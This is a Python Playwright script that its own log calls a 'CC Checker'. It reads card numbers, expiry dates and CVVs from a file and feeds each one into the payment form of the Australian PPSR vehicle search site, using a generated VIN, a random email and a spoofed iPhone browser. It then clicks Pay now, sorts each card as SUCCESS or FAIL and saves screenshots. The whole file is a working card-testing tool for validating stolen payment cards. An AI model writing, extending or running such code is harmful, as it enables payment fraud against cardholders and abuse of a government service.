import asyncio
import os
import random
import string
import sys
from datetime import datetime
from playwright.async_api import async_playwright
from gen_vin import generate_vin
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel

console = Console()

# Paths
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
DATA_DIR = os.path.join(BASE_DIR, "data")
SCREENSHOTS_DIR = os.path.join(BASE_DIR, "screenshots")
RESULTS_FILE = os.path.join(DATA_DIR, "results.txt")
CARDS_FILE = os.path.join(DATA_DIR, "cards.txt")
CC_LOG_FILE = os.path.join(DATA_DIR, "cc_log.txt")

def log_to_file(msg):
    with open(CC_LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")

async def process_card(page, card_data, status_live):
    parts = card_data.split('|')
    if len(parts) < 4:
        return "SKIP"
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    
    def update_status(step, detail=""):
        log_to_file(f"{step}: {detail}" if detail else step)
        table = Table(show_header=False, box=None)
        table.add_row(f"[bold cyan]Card:[/bold cyan] {cc}|{mm}|{yy}|{cvv}")
        table.add_row(f"[bold yellow]Step:[/bold yellow] {step}")
        if detail:
            table.add_row(f"[bold blue]Info:[/bold blue] {detail}")
        status_live.update(Panel(table, title="[bold green]Live Processing Analysis[/bold green]", border_style="bright_blue"))

    update_status("Starting navigation", "Navigating to PPSR search page...")
    
    try:
        # 1. Navigate to PPSR search page
        await page.goto('https://transact.ppsr.gov.au/ppsr-mobile/QMVS', wait_until="networkidle")
        
        # Check if there's a "Continue" button (Important message page)
        update_status("Handling landing page", "Checking for 'Continue' button...")
        continue_btn = page.get_by_role('button', name='Continue')
        if await continue_btn.is_visible():
            await continue_btn.click()
            await page.wait_for_load_state("networkidle")
            
        # 2. Fill search form
        vin = generate_vin()
        email = f"user_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}@outlook.com"
        
        update_status("Filling search form", f"VIN: {vin}\nEmail: {email}")
        
        # Explicitly wait for the textbox to be ready
        vin_field = page.get_by_role('textbox', name='VIN/Chassis number:')
        await vin_field.wait_for(state="visible", timeout=10000)
        await vin_field.fill(vin)
        await page.get_by_role('textbox', name='E-mail:').fill(email)
        
        update_status("Submitting search", "Clicking 'Proceed to Payment'...")
        await page.get_by_role('button', name='Proceed to Payment').click()
        
        # 3. Fill payment form
        update_status("Filling payment details", "Waiting for payment form...")
        
        card_number_field = page.get_by_role('textbox', name='Card number:')
        try:
            await card_number_field.wait_for(state="visible", timeout=15000)
        except Exception:
            page_text = await page.evaluate('() => document.body.innerText')
            if "An error has occurred" in page_text:
                update_status("Error", "System error before payment form")
                screenshot_filename = f"error_prepayment_{cc[-4:]}.png"
                screenshot_path = os.path.join(SCREENSHOTS_DIR, screenshot_filename)
                await page.screenshot(path=screenshot_path)
                status = "ERROR_PREPAYMENT"
                from datetime import datetime
                timestamp = datetime.now().isoformat()
                with open(RESULTS_FILE, "a") as f:
                    f.write(f"{cc}|{mm}|{yy}|{cvv}|{status}|{screenshot_filename}|{timestamp}\n")
                return status
            raise

        update_status("Filling payment details", "Entering credit card information...")
        await card_number_field.fill(cc)
        await page.get_by_role('textbox', name='Expiry month:').fill(mm)
        await page.get_by_role('textbox', name='Expiry year:').fill(yy)
        await page.get_by_role('textbox', name='CSC:').fill(cvv)
        
        # 4. Click Pay now
        update_status("Finalizing payment", "Clicking 'Pay now'...")
        await page.get_by_role('button', name='Pay now').click()
        
        # 5. Wait for result and capture
        update_status("Processing", "Waiting for transaction results...")
        
        # INCREASED ROBUSTNESS: Wait for specific success/fail elements
        success_selector = "text=/Thank you/i, text=/Successful/i, text=/received/i"
        fail_selector = "text=/declined/i, text=/failed/i, text=/error/i, text=/invalid/i, .error, .alert-danger"
        
        try:
            # Wait up to 25s for either success or failure to appear
            await page.wait_for_selector(f"{success_selector}, {fail_selector}", timeout=25000)
        except Exception:
            await asyncio.sleep(5) # Fallback to short wait if selector fails
        
        # Analysis
        update_status("Analysis", "Capturing page data...")
        page_text = await page.evaluate('() => document.body.innerText')
        
        # Comprehensive success/fail patterns
        fail_patterns = ["declined", "failed", "invalid card", "insufficient funds", "error", "expired", "not authorized"]
        success_patterns = ["thank you", "successful", "received", "reference number", "receipt number"]
        
        status = "UNKNOWN"
        color = "yellow"
        
        for fp in fail_patterns:
            if fp.lower() in page_text.lower():
                status = "FAIL"
                color = "red"
                break
        
        if status != "FAIL":
            for sp in success_patterns:
                if sp.lower() in page_text.lower():
                    status = "SUCCESS"
                    color = "green"
                    break
        
        error_dialog = page.get_by_role("heading", name="Error")
        if await error_dialog.is_visible():
            status = "FAIL"
            color = "red"
        
        screenshot_filename = f"result_{cc[-4:]}.png"
        screenshot_path = os.path.join(SCREENSHOTS_DIR, screenshot_filename)
        update_status("Saving result", f"Status: [{color}]{status}[/{color}]\nSaving screenshot to {screenshot_path}")
        await page.screenshot(path=screenshot_path)
        
        from datetime import datetime
        timestamp = datetime.now().isoformat()
        with open(RESULTS_FILE, "a") as f:
            f.write(f"{cc}|{mm}|{yy}|{cvv}|{status}|{screenshot_filename}|{timestamp}\n")
            
        return status
            
    except Exception as e:
        update_status("Error", f"[bold red]{str(e)}[/bold red]")
        error_cc = cc if 'cc' in locals() else "unknown"
        await page.screenshot(path=os.path.join(SCREENSHOTS_DIR, f"crash_{error_cc[-4:]}.png"))
        return f"ERROR: {str(e)}"

async def main():
    creds_file = sys.argv[1] if len(sys.argv) > 1 else CARDS_FILE
    
    if not os.path.exists(creds_file):
        console.print(f"[bold red]File not found:[/bold red] {creds_file}")
        return
        
    log_to_file("=== CC Checker Session Started ===")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        
        with Live(auto_refresh=True) as live:
            while True:
                with open(creds_file, 'r') as f:
                    cards = [line.strip() for line in f if line.strip()]
                
                if not cards:
                    break
                    
                current_card = cards[0]
                remaining_cards = cards[1:]
                
                # ISOLATION: New context/page per card
                context = await browser.new_context(
                    viewport={'width': 375, 'height': 667},
                    user_agent='Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
                )
                page = await context.new_page()
                
                status = await process_card(page, current_card, live)
                
                await context.close() # Close context and page
                
                with open(creds_file, 'w') as f:
                    for card in remaining_cards:
                        f.write(card + '\n')
                
                console.print(f"[bold green]Processed:[/bold green] {current_card.split('|')[0][-4:]} -> {status}. [white]{len(remaining_cards)}[/white] left.")
                
                if len(remaining_cards) > 0:
                    await asyncio.sleep(2) # Stability delay
                else:
                    break
            
        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
